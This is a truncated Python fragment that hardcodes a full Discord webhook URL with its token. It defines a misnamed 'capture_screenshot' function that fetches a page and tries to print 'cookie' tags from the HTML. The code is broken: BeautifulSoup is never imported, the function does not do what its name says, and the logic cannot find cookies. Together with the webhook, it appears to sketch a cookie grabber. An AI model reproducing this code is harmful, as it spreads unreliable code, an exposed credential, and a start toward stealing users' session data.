import requests
from PIL import Image
from io import BytesIO
import discord

# Replace these values with your own
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1466864809336115495/WBtAV0ia3DmKjB1N6bcpCkDKJ8tSzXLC52SpJ7HixtpgzY_gLZlSYuABASAv5OfNWo4s"
IMAGE_URL = "https://th.bing.com/th/id/R.1bf215cfc038b9e3a8d4dbbb0f7d1de0?rik=U0%2fP0ec%2bpKgJMA&pid=ImgRaw&r=0"  # replace with the URL of the image you want to send

def capture_screenshot(url):
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        for cookie in soup.find_all('cookie'):
            print(cookie.attrs['name'] + ': ' + cookie.attrs
